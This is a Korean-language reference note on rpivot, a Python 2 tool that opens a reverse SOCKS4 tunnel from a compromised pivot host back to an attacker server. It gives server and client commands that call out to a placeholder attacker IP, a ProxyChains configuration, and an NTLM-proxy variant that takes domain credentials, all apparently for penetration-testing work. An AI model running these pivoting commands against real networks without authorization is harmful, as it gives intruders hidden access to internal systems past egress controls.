---
tags:
  - 기능/피벗
실행환경: ["Linux"]
필요권한: ["피벗 호스트의 셸"]
필요조건: ["Python 2 실행 환경", "피벗 호스트에서 공격 호스트의 rpivot server 포트로의 TCP 도달성"]
결과: ["SOCKS 프록시", "네트워크 접근"]
---

# rpivot

## 도구 개요

rpivot은 피벗 호스트의 클라이언트가 공격 호스트 서버로 역방향 연결을 만들고, 공격 호스트에 SOCKS4 프록시를 제공하는 Python 2 기반 도구다. 인바운드 연결이 어려운 피벗 호스트를 통해 내부 TCP 서비스에 접근하거나 외부 연결이 HTTP·NTLM 프록시를 거쳐야 할 때 유용하다.

## 필요한 입력과 실행 환경

- 실행 환경: 공격 호스트와 피벗 호스트의 Python 2
- server 입력: bind 주소, SOCKS listen 포트, client 수신 포트
- client 입력: 공격 호스트의 rpivot server 주소와 포트
- 네트워크 조건: 피벗 호스트에서 server 포트로 outbound TCP 연결 가능
- 선택 입력: egress HTTP/NTLM proxy 주소와 인증 정보
- `<ATTACKER_IP>`는 client가 outbound로 연결할 server host, SOCKS port는 attacker에 bind되며 `<PROXY_HOST>`는 optional egress proxy다. Python 2 runtime과 SOCKS4 제한을 TCP 목적지 접근과 별도로 확인한다.

## 표준 사용법

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
python2 client.py --server-ip <ATTACKER_IP> --server-port 9999
```

ProxyChains에서는 일반적으로 SOCKS4로 설정한다.

## 대표 예시

### 공격 호스트 server

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

확인할 출력:

- client 연결 대기와 SOCKS 포트 listen.

### 피벗 호스트 client

```bash
python2 client.py --server-ip <ATTACKER_IP> --server-port 9999
```

확인할 출력:

- server에 client 연결 생성.

### ProxyChains 설정

```text
[ProxyList]
socks4 127.0.0.1 9050
```

확인할 출력:

- `proxychains curl -I http://<INTERNAL_IP>`에서 내부 웹 응답.

### NTLM 인증 HTTP 프록시를 경유하는 client

```bash
python2 client.py --server-ip <RPIVOT_SERVER_IP> --server-port <RPIVOT_SERVER_PORT> --ntlm-proxy-ip <HTTP_PROXY_IP> --ntlm-proxy-port <HTTP_PROXY_PORT> --domain <DOMAIN> --username <USER> --password '<PASSWORD>'
```

확인할 출력:

- rpivot server에 `New connection from host`가 표시되면 NTLM 프록시를 거쳐 client가 server에 연결된 것이다.
- 이 출력은 SOCKS를 통한 `<INTERNAL_IP>:<PORT>` 응답을 증명하지 않으므로 ProxyChains를 적용한 서비스 요청을 별도로 확인한다.

## 주요 옵션

| 옵션 | 의미 | 자주 쓰는 상황 |
|---|---|---|
| `--proxy-port` | 공격 호스트 SOCKS listen 포트 | ProxyChains가 붙을 포트 |
| `--server-port` | rpivot client 연결 포트 | 피벗 호스트 outbound 연결 |
| `--server-ip` | server 바인딩 또는 연결 IP | 공격 호스트 VPN/IP 지정 |
| `--ntlm-proxy-ip`, `--ntlm-proxy-port` | 경유할 NTLM 인증 HTTP proxy | server로 직접 outbound 연결할 수 없을 때 |
| `--domain`, `--username`, `--password` | NTLM proxy 인증 자료 | proxy 인증이 필요한 경우 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| client connected | reverse SOCKS 생성 | ProxyChains 설정 |
| `New connection from host` | rpivot client가 server에 도달 | SOCKS4 설정 후 내부 서비스 응답을 별도 확인 |
| 내부 웹 응답 | 피벗 성공 | 웹/서비스 열거 |
| ProxyChains timeout | SOCKS 설정 또는 내부 대상 문제 | SOCKS4 여부, 내부 IP/포트 확인 |
| client 연결 없음 | outbound 차단 | 공격 호스트 listen IP/포트 확인 |
| proxychains 실패 | SOCKS 버전 불일치 | `socks4 127.0.0.1 9050` 사용 |
| Python 오류 | Python2 환경 문제 | `python2 --version`, 의존성 확인 |

## 관련 공격기법

- [[Rpivot Reverse SOCKS 피벗팅]]
